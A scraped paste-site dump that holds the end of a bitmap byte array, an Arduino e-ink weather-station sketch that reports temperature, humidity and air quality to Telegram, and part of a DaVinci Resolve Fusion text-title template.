0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,};
"
hCc7bdWQ,Stazione Meteo Arduino V1.0,overvolt,C++,Tuesday 23rd of April 2024 10:45:21 AM CDT,"
// E-INK
#include <GxEPD.h>
#include <GxIO/GxIO_SPI/GxIO_SPI.h>
#include <GxIO/GxIO.h>
#include <GxGDEH0154D67/GxGDEH0154D67.h>

#include ""bitmap.h""

#include <Fonts/FreeSansBold18pt7b.h>     //FONT SANS BOL 18P
#include <Fonts/FreeSansBold24pt7b.h>     //FONT SANS BOL 24P

GxIO_Class io(SPI, 10, 9, 8);   // CREO SERIALE PER E-INK -- CS DC RST
GxEPD_Class display(io, 8, 7);  // CREO DISPLAY PER E-INK -- Seriale RST BUSY


// WIFI E TELEGRAM
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>

const char* ssid = ""arduinooo"";
const char* password = ""arduinami"";

#define BOTToken ""xxxxx""
#define CHAT_ID ""xxxxx""

WiFiClientSecure client;
UniversalTelegramBot bot(BOTToken, client);


// SENSORI
#include ""DHT.h""
#include ""MQ135.h""

MQ135 mq135_sensor(A1);
DHT dht(2, DHT11);

float t, h, PPM;



void setup() {
  Serial.begin(115200);
  display.init();
  display.setRotation(2);

  dht.begin();

  WiFi.mode(WIFI_STA);

  splash();
}


void loop() {
  lettura_sensori();
  stampa_valori();
  messaggio();
  delay(3600000);
}


void splash() {
  display.eraseDisplay();                                       //SVUOTO DISPLAY
  display.drawExampleBitmap(logo, 0, 0, 200, 200, GxEPD_BLACK); //SETTO IL LOGO 
  display.update();                                             //STAMPO
  delay(3000);                                                  //ASPETTO 3 SEC

  display.drawExampleBitmap(gui, 0, 0, 200, 200, GxEPD_BLACK);
  display.update();                                             //STAMPO
}


void lettura_sensori() {
  t = dht.readTemperature();
  h = dht.readHumidity();
  PPM = mq135_sensor.getCorrectedPPM(t, h);
}


void stampa_valori() {
  display.setRotation(3);
  display.fillRect(65,0,135,200, GxEPD_WHITE);

  display.setFont(&FreeSansBold24pt7b);
  display.setTextColor(GxEPD_BLACK);

  display.setCursor(65,50);
  display.print(String(t,1));

  display.setCursor(65,115);
  display.print(String(h,0) + ""%"");

  display.setCursor(65,180);
  if (PPM > 100000) display.setFont(&FreeSansBold18pt7b);
  display.print(String(PPM,0));

  display.update();
}


void messaggio() {
  WiFi.begin(ssid, password);
  client.setCACert(TELEGRAM_CERTIFICATE_ROOT);

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(""."");
  }
  Serial.println("""");
  Serial.println(""WiFi connesso"");

  bot.sendMessage(CHAT_ID, ""\xf0\x9f\x8c\xa1 "" + String(t,1) + ""°C \n \xf0\x9f\x92\xa7 "" + String(h,0) + ""% \n \xf0\x9f\x92\xa8 "" + String(PPM,0) + "" PPM"");  //invia il messaggio
  
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
}
"
sxy7Erbw,Brackets,marcusa3000,Lua,Tuesday 23rd of April 2024 10:43:02 AM CDT,"{
	Tools = ordered() {
		DarkBoxText = GroupOperator {
			CtrlWZoom = false,
			CustomData = {
				Path = {
					Map = {
						[""Setting:""] = ""/Applications/DaVinci Resolve Studio.app/Contents/Resources/Fusion/Templates/Templates.drfx/Edit/Titles/""
					}
				},
			},
			Inputs = ordered() {
				Input6 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""StyledText"",
				},
				Input7 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Font"",
					ControlGroup = 4,
				},
				Input8 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Style"",
					ControlGroup = 4,
				},
				Input9 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Red1Clone"",
					Name = ""Color"",
					ControlGroup = 5,
					Default = 1,
				},
				Input10 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Green1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input11 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Blue1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input12 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Alpha1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input13 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Size"",
					Default = 0.0591,
				},
				Input14 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""CharacterSpacingClone"",
					Name = ""Tracking"",
					Default = 1,
				},
				Input15 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""LineSpacingClone"",
					Default = 1,
				},
				Input16 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Strikeout"",
					Name = ""Emphasis"",
					ControlGroup = 9,
				},
				Input17 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Underline"",
					Name = ""Emphasis"",
					ControlGroup = 9,
				},
				Input1 = InstanceInput {
					SourceOp = ""Transform4"",
					Source = ""Center"",
					Name = ""Position"",
				},
				LineColor = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""LineColor"",
					Page = ""Controls"",
				},
				Input2 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftRed"",
					Name = ""Color"",
					ControlGroup = 2,
					Default = 0.8270000219345,
				},
				Input3 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftGreen"",
					ControlGroup = 2,
					Default = 0.5934485793114,
				},
				Input4 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftBlue"",
					ControlGroup = 2,
					Default = 0.1149529963732,
				},
				Input5 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftAlpha"",
					ControlGroup = 2,
					Default = 1,
				}
			},
			Outputs = {
				Output2 = InstanceOutput {
					SourceOp = ""Path5"",
					Source = ""Heading"",
				},
				MainOutput1 = InstanceOutput {
					SourceOp = ""KeyframeStretcher1"",
					Source = ""Result"",
				},
				Output1 = InstanceOutput {
					SourceOp = ""Path6"",
					Source = ""Heading"",
				}
			},
			ViewInfo = GroupInfo {
				Pos = { 220, 49.5 },
				Flags = {
					Expanded = true,
					AllowPan = false,
					ConnectedSnap = true,
					AutoSnap = true,
					RemoveRouters = true
				},
				Size = { 714.18, 414.966, 357.09, 36.2677 },
				Direction = ""Horizontal"",
				PipeStyle = ""Direct"",
				Scale = 1,
				Offset = { 0, 0 }
			},
			Tools = ordered() {
				KeyframeStretcher1 = KeyStretcher {
					Inputs = {
						Keyframes = Input {
							SourceOp = ""Transform4"",
							Source = ""Output"",
						},
						SourceEnd = Input { Value = 125, },
						StretchStart = Input { Value = 46, },
						StretchEnd = Input { Value = 88, },
					},
					ViewInfo = OperatorInfo { Pos = { 294, 329.722 } },
				},
				Transform4 = Transform {
					Inputs = {
						Input = Input {
							SourceOp = ""Merge5"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 144.178, 329.722 } },
				},
				Merge5 = Merge {
					Inputs = {
						Blend = Input {
							SourceOp = ""Merge5Blend"",
							Source = ""Value"",
						},
						Background = Input {
							SourceOp = ""LineColor"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""ChannelBooleans3"",
							Source = ""Output"",
						},
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 329.722 } },
				},
				Merge5Blend = BezierSpline {
					SplineColor = { Red = 205, Green = 205, Blue = 205 },
					CtrlWZoom = false,
					KeyFrames = {
						[17] = { 0, RH = { 23, 0.333333333333333 }, Flags = { Linear = true } },
						[35] = { 1, LH = { 29, 0.666666666666667 }, RH = { 53.3333333333333, 1 }, Flags = { Linear = true } },
						[90] = { 1, LH = { 71.6666666666667, 1 }, RH = { 96, 0.666666666666667 }, Flags = { Linear = true } },
						[108] = { 0, LH = { 102, 0.333333333333333 }, Flags = { Linear = true } }
					}
				},
				ChannelBooleans3 = ChannelBoolean {
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Instance_Text1_1_1_1"",
							Source = ""Output"",
						},
						MultiplyByMask = Input { Value = 1, },
						Background = Input {
							SourceOp = ""Transform3"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -106.23, 329.722 } },
				},
				Instance_Text1_1_1_1 = TextPlus {
					ExtentSet = true,
					SourceOp = ""Text"",
					Inputs = {
						Softness6 = Input { },
						Properties6 = Input { },
						Size6 = Input { },
						Shear6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						EffectMask = Input { },
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled6 = Input { },
						Properties1 = Input { },
